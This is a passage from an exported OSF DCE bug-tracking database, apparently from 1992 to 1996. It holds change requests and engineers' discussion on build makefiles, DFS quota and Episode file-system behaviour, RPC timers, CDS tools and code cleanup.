[01/04/93 public]
Forgot one change:

  osf.std.mk
  ----------
    Added .i to SUFFIXES list.

[01/08/92 public]
I was in an OT frenzy at the time I entered the last note.  It actually 
belongs on the end of 6708.

[1/28/93 public]
This is a dup of defect #5188.

[1/29/93 public]
I hate to be retentative (BUT I CAN'T HELP IT!!), but this is not a defect
of 5188.  
   The 5188 defect refers to the sequence:
      During the EXPORT pass
        idl runs and generates a .h in the obj tree, which is then exported
        to the export tree.  So the dates for the .idl and the two .h files
        now looks like this:
          src              obj               export
         .idl older than   .h  same date as   .h

      During some subsequent pass:
        idl runs to generate a *_cstub.c, *_sstub.c or some such.  In the
        course of doing this, idl generates a new .h file.  So NOW the 
        dates for the .idl and the two .h's looks like this:
          src              obj               export
         .idl older than   .h  NEWER THAN     .h

      On the next EXPORT pass, make performs the following sequence of 
      checks:
         I want to build ../export_tree/.h, it depends on .h. where is 
         .h?  It is here in the obj tree.  
         
         .h in the obj tree depends on the .idl file.  Where is the .idl
         file?  It is in the src tree.  Is it newer than the .h in the obj
         tree? No.  So the .h in the obj tree is up to date.  (Which is 
         why idl does not regenerate the .h on each EXPORT pass).

         Is the .h in the obj tree newer than the .h in the export tree?
         YES!  I better tar it/copy -p it out to the export tree.

     So the problem here is how to either make the export version of the
     .h depend on  the .idl file in the src tree, or to avoid changing the
     date on the .h file in the obj tree when the .*stub.c is generated.

     There is another problem hidden in defect 5188 as well.  When the 
     subsequent pass causes idl to regenerate the .h file, it may pick a 
     .acf file that could change the contents of the .h file that is 
     eventually, as described above, to the export tree.

    
     I filed this defect against the fact that there is now dependency path
     in the common Makefiles for a .idl to .o transformation as there is
     for a .idl to .c transformation.  The defect describes via makefile
     excerpts, the kind of support that would have to be added to the
     common makefiles to make these kind of rules work.  

     Defer me, call me an enhancement, but don't dup me! :-)

[2/3/93 public]
Okay, it's not a dup.  However, we've got to defer this.

[10/15/93 public]

Defer to the 1.1 code cleanup work.
Re-assigned to me, since cjd is no longer a rat.

[7/1/94 ]
reassigned to Annie

[07/01/94 public]
Did this get fixed during Bill Sommerfeld's common makefile changes?

[09/26/94 public]
A quick glance at the common Makefiles do not show the enhancement being
incorporated.  However, since the capabilities seem to be there, and we
are running out of time for DCE1.1, this bug has been deferred to DCE1.2
for more investigation and such.

thanks
annie

[02/6/96 public]
Looks like deferring is a tradition! Changed to Enh req.



CR Number                     : 6708
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : bld
Subcomponent Name             : common makefiles
Short Description             : should be able to generate pre-processed files automatically
Reported Date                 : 12/31/92
Found in Baseline             : 1.0.2b8
Found Date                    : 12/21/92
Severity                      : C
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : src/lbe/mk/osf.stc.mk src/lbe/mk/osf.obj.mk
Sensitivity                   : public

[12/31/92 public]
It should be possible to easily generate post-preprocessor versions of 
files for debugging purposes.  This is is easily implemented in the common
makefiles.  I have a prototype of the changes (that I have been using for
a while) in a sandbox if anyone is interested.

[ Disclaimer: this may be a dup.  I have been holding this defect with the
  intent of checking to see if it was already entered, but the schedule being
  what it is, I have no time.
]

[01/04/92 public]
Rich Zeliff requested that I attach the prototype changes I alluded to in
the original bug comment to the defect:

  osf.obj.mk
  ----------
    Added the following rules:

     .c.i:
        ${_CC_} ${CC_NO_OBJ} ${_CCFLAGS_} ${.IMPSRC} > ${.TARGET}


     .y.i:
        ${YACC} ${_YFLAGS_} ${.IMPSRC}
        ${_CC_} ${CC_NO_OBJ} ${_CCFLAGS_} y.tab.c
        -${RM} ${_RMFLAGS_} y.tab.c
        ${MV} -f y.tab.o ${.TARGET}


     .l.i:
        ${LEX} ${_LFLAGS_} ${.IMPSRC}
        ${_CC_} ${CC_NO_OBJ} ${_CCFLAGS_} lex.yy.c
        -${RM} ${_RMFLAGS_} lex.yy.c
        ${MV} -f lex.yy.o ${.TARGET}

 [ Note: these are the standard .something to .o rules with a different
         target suffix and a new flag variable on the _CC_ line - ${CC_NO_OBJ}
         This is defined as described below.
 ]


 osf.dce.mk
 ----------
   Added the following assignment:

     CC_NO_OBJ=${NO_OBJ:D${NO_OBJ}:U${${TARGET_MACHINE}_NO_OBJ_FLAG}}

 [ Note: ${TARGET_MACHINE}_NO_OBJ_FLAG} would be defined in some global
         place (like the Makeconf file) to be the compiler flag for 
         pre-processing only for a particular platform; ie: on the PMAX, 
 
           PMAX_NO_OBJ_FLAG = -E

         I understand that this puts a one compiler per platform limit on
         the compilers that this method could support, but this is only a 
         prototype.  The correct variable expansion for setting CC_NO_OBJ
         to the correct flag for the compiler of choice on a given platform
         is left as an exercise for the reader (something like
           CC_NO_OBJ = ${NO_OBJ:D${NO_OBJ}:U${${_CC_TYPE_}_NO_OBJ_FLAG}}
         though, of course, you need to allow for per Makefile overrides
         for ${CC_TYPE}_NO_OBJ_FLAG, etc.
 ]

  
 These two changes allow me (having set NO_OBJ to be -E in my Makefile) to
 enter "build xxx_server.i" and get the pre-processed file in my obj directory.

[01/07/93 public]
I mentioned this before to Mark in email and he agress:  NO_OBJ is a
bad name.  Something like CPP_ONLY is better.

[01/04/93 public]
Forgot one change:

  osf.std.mk
  ----------
    Added .i to SUFFIXES list.

[1/28/93 public]
This is really an enhancement to the makefiles.

[zeliff 12/23/93 public] 
Bumped pri/sev to C1 because this could be an important aid for code
cleanup work.  To see why, try figuring out which IFDEFed code path
actually is compiled in directory/cds/server.

Also, removed cjd as assignee.

[7/1/94 public]
re-assigned to Sally



CR Number                     : 6697
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : dfs
Subcomponent Name             : quota
Short Description             : files bigger than remaining quota
get corrupted when copied into lfs
Reported Date                 : 12/30/92
Found in Baseline             : 1.0.2
Found Date                    : 12/30/92
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[12/30/92 public]

I was trying to fill up an lfs fileset (mounted on a RIOS under a JFS
root.dce) that had 5000 blocks on it. I was able to copy 3 instances
of /unix onto it, and one partial:

root@cobbler> ls -las
total 5000
   4 drwxrwxrwx   2 root     system       416 Dec 30 14:54 .
   4 drwxrwxrwx  16 root     sys          512 Dec 30 15:29 ..
1432 -r-xr-xr-x   1 100      12       1458180 Dec 30 14:24 1
1432 -r-xr-xr-x   1 100      12       1458180 Dec 30 14:25 2
1432 -r-xr-xr-x   1 100      12       1458180 Dec 30 14:25 3
 696 -r-xr-xr-x   1 100      12        720896 Dec 30 14:54 4
root@cobbler>

I did some checking, and the first three copies all compare with /unix.

The last one, does not, but it's not just because of the truncation:

root@cobbler> cmp /unix 4
/unix 4 differ: byte 184321, line 251
root@cobbler>

Doing a cmp -l 4 /unix has a lot of lines like these:

184321   0 203
184322   0 377
184324   0   4
184325   0 110
184328   0  24
184329   0 221

where the file itself has zeros in it somewhere in the middle. Observation
of the cmp output seems to indicate a 12k (12288) byte block of zeros starting
at locations 184321 - 199608 decimal. This is consistent behavior.

[12/31/92 public]
Assigned to bwl.  Raised priority; this is a data corruption issue,
potentially.

Filled in Interest List CC with `ota,blake' 
Changed Priority from `2' to `1' 
Filled in Responsible Engr. with `bwl@transarc.com' 
Filled in Resp. Engr's Company with `tarc' 
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[12/31/92 public]
Episode is not at fault.  Sequential writes from the application are being
processed by the server in random (non-sequential) order, and consequently
there are holes in the file if the process is interrupted by quota failure.

This could be fixed by some sort of quota reservation on the part of the CM.
Of course, aggregate space reservation would have to be done too, and even
then a server crash could leave you with holes in the file.

Alternatively, the CM could promise that one write won't be sent down to the
server until the previous one has finished.  Or, the CM could send them down
all at once, but put serial numbers on them, so that the server would not
start one, until the previous ones have completed.  In any case, there never
was any point in having multiple server threads doing I/O to the same file,
because they usually end up contending for one disk head anyway, and moreover,
because they don't get processed in order, you can't take advantage of any of
the usual optimizations for sequential or bulk I/O in the physical file system. So my vote is for re-serializing the I/O, one way or another. 
Changed Responsible Engr. from `bwl@transarc.com' to `kazar@transarc.com'

[1/8/93 public]

I don't consider this a bug, but rather a request for an enhancement.
Here's the rationale.

DFS, AFS 3, and, for that matter, NFS, have never made the guarantee
that if a close system call fails because of the disk being full, that
only a true prefix of the write stream has been written to the file.

Consider the case where a user writes some data to block 0 of a file,
writes more data to block 1 of a file (creating that block), and then
writes even more data to block 0 of a file.  Then the file is closed.
Ranlib is probably a good example here.  AFS 3, DFS and NFS all would
fail to return any error before the file is closed, and the close
would fail with EDQUOT or ENOSPC.  However, the data written by writes
1 and 3 would have been placed in the fiel, while the data written by
write #2 wouldn't have been written to the file.

That being said, it is probably reasonable for DFS to try to handle
the case of sequentially writing to a file a little better, at least
in most cases.  So, I've reclassified this problem as a low priority
enhancement, since it would be nice for DFS to, when handling
sequential writes, to drop the *last* writes, not the first, to the
file.

However, this isn't really changing any of the *guarantees* we make;
we're still not going to make any hard claims about what writes will
have occurred if an ENOSPC error is returned from close.  We're just
going to try to reduce the frequency of a common failure mode.
Changed Defect or Enhancement? from `def' to `enh' 
Changed Severity from `B' to `E' 
Changed Priority from `1' to `4'



CR Number                     : 6648
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : krb
Short Description             : null file in krb5
Reported Date                 : 12/28/92
Found in Baseline             : 1.0.2
Found Date                    : 12/28/92
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
./security/krb5/lib/crc-32/crc-test
Sensitivity                   : public

[12/28/92 public]
./security/krb5/lib/crc-32/crc-test is a zero-length file and should be
defuncted.

[12/28/92 public]
Assuming that this file is in fact unnecessary, it's a cleanup issue, not a
Severity 'C' (Severe / Major) defect.  I've changed it from sev C defect to
sev E enhancement.



CR Number                     : 6626
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 6399
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : EPISODE
Short Description             : no way to set allocated quota
Reported Date                 : 12/23/92
Found in Baseline             : 1.0.2
Found Date                    : 12/23/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[12/23/92 public]
The changes to fts, et al, only affect visible quota.  However, in
somecases we will need a way to set the allocated quota, if for no other
reason than to provide an upgrade path.  Perhaps only efts could be
modified.
ftsets will need to use this to test allocated quota checking anyway.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[9/14/93 public]
A very tough one. We need a new fts switch to set the 'allocated quota'.
But, it would be confusing also because we already have a visible quota size.
Marked this as an enhancement after talking to Ted.

[9/14/93 public]
Changed the defect field.
Changed Defect or Enhancement? from `def' to `enh'

[9/14/93 public]
Changed Interest List CC from `cfe, jdp' to `cfe, jdp, jeff@transarc.com'

[1/24/94 public]
Changed Subcomponent Name from `lfs' to `EPISODE'



CR Number                     : 6618
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : bak
Short Description             : uuid mismatch on restoredb
Reported Date                 : 12/23/92
Found in Baseline             : 1.0.2
Found Date                    : 12/23/92
Severity                      : B
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com

[12/23/92 public]

The backup database stores UUIDs for butc hosts along with the port offsets.
These UUIDs are generated new each time a host is added to the backup
database. When a BUTC program starts up it reads the UUID corresponding
to its hostname and port offset and uses it to register itself in the rpcd.
When restoring a database, the host information is also restored. If the
UUID of the restored host is different from the one that is in the database,
bak commands to that host would fail to reach the butc running in that host
at the corresponding port offset. The butc in that particular host has to 
be restarted so that it reads in the new UUID and re-registers it in rpcd.
This OT is to implement an alternative mechanism by which BUTC automatically
recognizes such UUID mismatches and re-registers itself. Until then, the
document on butc should mention this so that administrators are aware of this.

Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'



CR Number                     : 6547
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : krpc
Short Description             : combine kernel "login contexts" to save memory
Reported Date                 : 12/21/92
Found in Baseline             : 1.0.1
Found Date                    : 12/21/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : rpc/kruntime/sec_authn_krpc.c
Sensitivity                   : public

[12/21/92 public]

It should be possible to get a moderate savings in kernel memory usage by
combining common versions of the pseudo-login-contexts that the kernel rpc
generates.  The savings is more than just the 8 bytes per context; it could
also involve some increased sharing in the DG CCT and the authentication
tables maintained by comauth.c, especially in the presence of DFS's
tendancy to throw away binding handles after only a few minutes.

[3/15/92 public]

This would also reduce the frequency of Cache Mgr upcalls to dfsbind
for security services.
Added kazar, toml to interest list.



CR Number                     : 6541
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : rpc
Subcomponent Name             : dg runtime
Short Description             : Poor choice of certain timers induce a gratuitous retransmission
Reported Date                 : 12/18/92
Found in Baseline             : 1.0.2
Found Date                    : 12/18/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[12/18/92 public]

The timer that induces retransmission of the final response packet from the
server interacts badly with the timer that induces the client to send an
"ack" (N.B. _not_ "fack").  "ack" sending is (correctly) deferred until
some time after the call completes.  (We're betting that the client is
going to make another call which will be an implicity "ack" of the previous
call's response.)  Unfortunately, the client delays so long that the server
retransmits the final response.  The fix is that the client should probably
send its "ack" sooner.

(Thanks to Dave Bachmann at IBM for noticing this.)

[1/7/93 public]
Promoted to enhancement.

[1/7/93 public]

Perhaps you could share with us why you deem this an enhancement.

[1/8/93 public]

There was a review of the OT RPC data base on 1/6/93 which included 
representatives from DEC, HP, and OSF. It was determined that the CR 
as stated above appears to be accurate, the behavior suboptimal,
but not broken.



CR Number                     : 6503
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : cds
Subcomponent Name             : cdscp
Short Description             : Provide syntax help for cdscp subcommands
Reported Date                 : 12/16/92
Found in Baseline             : 1.0.2b6
Found Date                    : 12/16/92
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/16/92 public]
From an SE intern:
The help command of cdscp gives a result different from other DCE
administration tools.   With the other administration tools (rgy_edit, 
dtscp, acl_edit...), it is possible to ask help on a specific function 
(eg, help add) and this gives the proper syntax to use.  A similar 
facility should be implemented in cdscp.



CR Number                     : 6500
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : EPISODE
Short Description             : VM extension of sparse file handles old EOF wrong
Reported Date                 : 12/16/92
Found in Baseline             : 1.0.2
Found Date                    : 12/16/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com
Transarc Status               : open

[12/16/92 public]
It seems that if a file is truncated down to the middle of some block
then the VM system sparsely extends the file no one actually gets around
to zeroing the final bytes in what used to be the last block of the
file.  This is also a problem for COW files (where what used to be the
last block may also have to be allocated).  Similarly the quota
reservation code cannot cope with reserving two sections of the file
which can be disjoint in a single call.
The solution may be to require truncate to do more of the work in this
case.  Namely, clearing the end of the last block of the file.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[9/30/93 public]
The VM system has a bug currently causing the zerofill test to fail but
this will be fixed shortly and is being tracked by DB4349.
The quota reservation problem is real but hard to fix.  We will not be
able to fix this anytime soon.  However, the exposure to this problem is
quite slight since it requires partial truncates and sparse writes and a
nearly full disk all at the same time.
Further work on this problem will be tracked under DB4410.
Changed Defect or Enhancement? from `def' to `enh' 
Changed Interest List CC from `bwl' to `bwl,blake' 
Filled in Reported by Company's Ref. Number with `4410'

[7/18/94 public]
This was fixed as part of the VM reorganization done for Transarc defect
5134 and related deltas.  The zerofill test passes with these fixes.
Changed Subcomponent Name from `lfs' to `EPISODE'



CR Number                     : 6497
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : Need ability to determine protocol sequences capable of broadcast RPC
Reported Date                 : 12/16/92
Found in Baseline             : 1.0.2b6
Found Date                    : 12/16/92
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[12/16/92 public]
I found a hard-coded use of protocol sequence ncadg_ip_udp in the CDS
advertiser; when I asked about it, Mark Fox said it seemed to be the
best way to ensure that ncacn_ip_tcp wouldn't be chosen.  This limits
the possibility of future protocol sequences on which broadcast RPC
could be supported.  There should be a mechanism comparable to 
rpc_network_inq_protseqs() to return a vector of protocol sequences
capable of broadcast.  That way, there would be no need to hard-code
use of ncadg_ip_udp.



CR Number                     : 6407
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : unreliable method of
generating the number 2 in rpc__naf_desc_inq_naf_id
Reported Date                 : 12/10/92
Found in Baseline             : 1.0.2b5
Found Date                    : 12/10/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[12/10/92 public]
unreliable method of generating the number 2 in rpc__naf_desc_inq_naf_id
(bytes to copy for sa length).

   886      addr = (rpc_addr_p_t) buff;
   887  #ifndef AIX32
   888      addr->len = sizeof (addr->sa.family);

Since addr->len is subsequently passed into getsockname() as the number of
bytes to copy into the sockaddr(_t), using the size of addr->sa.family
to ensure enough bytes are copied is not reliable.  This method assumes 
that sa.family will always be the first element of the sockaddr.  Although
this works (on 4.3 sockets, anyway), perhaps it would be better to define 
a macro to set how many bytes must be copied to get the family returned in
the sockaddr.  

   889  #else
   890      addr->len = (long) (&(addr->sa.data) - &(addr->sa));

This is illegal pointer arithmetic: subtraction of pointers to structure 
components is illegal.  See aix 3.2 compiler output below.  Although this
could be fixed by casting both the minuend and the subtrahend to pointer
to long, masking compiler errors is not a good idea.  The fix suggested
above would eliminate the need for conditional compilation here.

   891  #endif /* AIX32 */
 
<2033> build OPT_LEVEL=-g comnaf.o
relative path: ./rpc/runtime.
cd ../../../obj/rios/rpc/runtime
xlc_r -c    -DAIX_PROD -M -g  -DNCK -DPROT_NCADG -DPROT_NCACN  -DAUTH_KRB
-DNAF_IP -DDNS_CDS -DDNSPI_V3 -DDNS_V3API   -DRRPC  -Dunix -D_ALL_SOURCE 
-D_BSD=44 -D_ SOCKADDR_LEN  -DNO_SIOCGIFADDR -DNOENCRYPTION -DDEBUG    -I.
-I/home/page/beach/cn/src/rpc/runtime -I/project/dce/build/dce.46e/src/rpc
/runtime  -IRIOS -I/home/page/beach/cn/src/rpc/runtime/RIOS -I/project/dce
/build/dce.46e/src/rpc/runtime/RIOS -I/home/page/beach/cn/export/rios/usr/
include -I/project/dce/build/dce.46e/export/rios/usr/include  ../../../../
src/rpc/runtime/comnaf.c "../../../../src/rpc/runtime/comnaf.c", line 904.
42: 1506-016 (E) Operands must be pointers to compatible types.



CR Number                     : 6402
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 6340
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : security/dacl
Short Description             : Need to remove references to EPI_USE_FULL_ID
Reported Date                 : 12/10/92
Found in Baseline             : 1.0.2
Found Date                    : 12/10/92
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : mcinerny@transarc.com

[12/10/92 public]

Now that Episode uses only full-IDs (never 32-bit IDs), this
compile-time constant is obsolete and should be removed.  It is used
only in file/security/dacl/epi_id.{c,h} and Makefile (I think).

We noticed this problem when tracking down OT 6340 (which has been
cancelled).

It might also be suggested that all the code paths referring to the
old 32-bit IDs be excised for the sake of clarity.

Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mcinerny@transarc.com' 
Added field Transarc Status with value `open'



CR Number                     : 6394
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : thr
Subcomponent Name             : 
Short Description             : TRY gets compile warnings on hpux
Reported Date                 : 12/9/92
Found in Baseline             : 1.0.2
Found Date                    : 12/9/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/9/92 public]

Each occurance of the TRY macro in the source gets two compile-time
warnings on HPUX (the compiler is very finicky about casting volatile data
to non-volatile data).  Since we're using HPUX systems for development of
new features, this causes us to tend to ignore compiler warning messages
(which is generally a Bad Thing).

The fix is somewhat convoluted, but can be appropriately #ifdef'ed so that
non-HP-UX compilers see exactly the same source (modulo whitespace changes)
after the preprocessor.

A context diff of the fix will be posted here shortly..



CR Number                     : 6357
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : cds
Subcomponent Name             : cds/server/back_collect.c
Short Description             : Redundant code referencing
Secondary replicas.
Reported Date                 : 12/7/92
Found in Baseline             : 1.0.1
Found Date                    : 12/7/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/7/92 public]

NOTE: This is not a a bug but rather suggestion to improve performance.
      


Scenario:
    The code right now has logic build in to reference secondary
    replica. But since secondary replicas are NOT SUPPORTED in DCE,
    the code referring to secondary replica should be removed or
    "#ifdef out". For example, in the collecting of changes to a
    replica in a skulk, we can simplify the logic because there is
    no long need to do 'collecting' because all the changes are in
    the master. All that has to been done is to start the spreading
    from the master replica assuming that the epoch has not changed.
    Even if the epoch has changed ( a new master ) , the collection
    phase could be simplify to collect from the new and old master
    replica only since other read-only replicas do not contain any
    changes.
Effects:
   Lower system performance

Repeat By:

        Create replicas of directories in other clearinghouses and
        modify the contents (objects) in the replica. Then Skulk
        the directory to initate the collecting and spreading process.

Proposed Solution:
        Cleanup the code to remove logic and code concerning secondary
        replicas.

[12/7/92 public]
We have looked at this in the past and concluded that the "new epoch"
command requires much of this code to work. Admittedly there is code
that can be deleted.



CR Number                     : 6342
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : bak
Short Description             : Record filesystem type in backup database
Reported Date                 : 12/4/92
Found in Baseline             : 1.0.2
Found Date                    : 12/4/92
Severity                      : D
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com

[12/4/92 public]
An enhancement that might be useful, is recording the type of a dump
in the dump database, i.e. whether the fileset dumped is LFS, AIX JFS or OSF/1
UFS. After recent changes, the dumps themselves should be portable
to any type of filesystem, however, treatment of certain items, such as
ACLs, will depend on the source and destination filesystem type.

A type field would be useful for at least a couple of things:
- knowing if ACLs were part of the dump
- diagnosing/debugging problems of portability

Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'



CR Number                     : 6330
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : cm
Short Description             : ACL is inaccessbile via CM path
Reported Date                 : 12/4/92
Found in Baseline             : 1.0.2
Found Date                    : 12/4/92
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com
Transarc Delta                : 

[12/4/92 public]
As cell_admin I tried to modify an ACL with the wrong cell information
via DFS; it failed.  I locally mounted it and it succeeded, which
seems to imply the CM (or PX) is refusing to make the change, even
though the change is a valid/legal one.
The way to set this up is to create an ACL in an existing DFS cell;
shut the cell down and reconfigure it (using dce_config) so that the
new cell has a new uuid.  Now, try to run acl_edit on the protected
directory.  Use the "cell" command to set the cell to the current
name. Then use the "commit" command to save the acl - acl_edit will
fail while trying to save back the acl.
Locally mount the fileset containing this directory.  Repeat the steps
and note that the set succeeds.  You should now be able to see the
right cell name in both the local and DFS cases.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[12/30/92 public]
This is almost certainly an ACL package bug, or an Episode bug.  Since
Episode's access control logic does completely different things for
local and remote calls (only one has a PAC, for example), it isn't
surprising that the behavior is different for the two paths.
Nevertheless, the CM only asks whether we have "C" rights, and if so,
sends a setacl call directly to the fx.  So, I'm re-assigning this to
the Episode folks to take a look at.
They should verify that they report that cell_admin has "C" rights to
the object (according to the extended getacl), and that they allow the
setacl call to get through.
Furthermore, I'm reclassifying this as an enhancement, since the
problem only occurs apparently when a cell is pretty badly
misconfigured (in the wrong cell!).
Changed Defect or Enhancement? from `def' to `enh' 
Changed Responsible Engr. from `kazar@transarc.com' to `mason@transarc.com'

[11/15/93 public]
Changed Reported by from `mason@transarc.com' to `ota@transarc.com' 
Added field Transarc Delta with value `'

[11/15/93 public]
Changed Reported by from `ota@transarc.com' to `mason@transarc.com' 
Changed Responsible Engr. from `mason@transarc.com' to `ota@transarc.com'



CR Number                     : 6321
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : EPISODE
Short Description             : vol_efsRead, vol_efsWrite should use VM
Reported Date                 : 12/3/92
Found in Baseline             : 1.0.2
Found Date                    : 12/3/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com
Transarc Status               : open

[12/3/92 public]
At the moment, the Episode volops for reading and writing files work, but they
read and write the unbuffered disk (on platforms that use VM).  I expect that
they should be using VM on platforms that have VM available, and that the
current implementation that doesn't use a buffered disk may be a serious
performance problem.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[11/11/93 public]

[11/11/93 public]
Opened this as db4668 in Transarc's database.
Changed Subcomponent Name from `lfs' to `EPISODE' 
Filled in Reported by Company's Ref. Number with `4668'

[11/11/93 public]
In general, the data in VM will be only a small part of all the data dumped.
It's hard to see how there would be a significant performance impact.
If you are seeing performance problems, look carefully for other causes.
The programming complexity is significant.  It's important that, during the
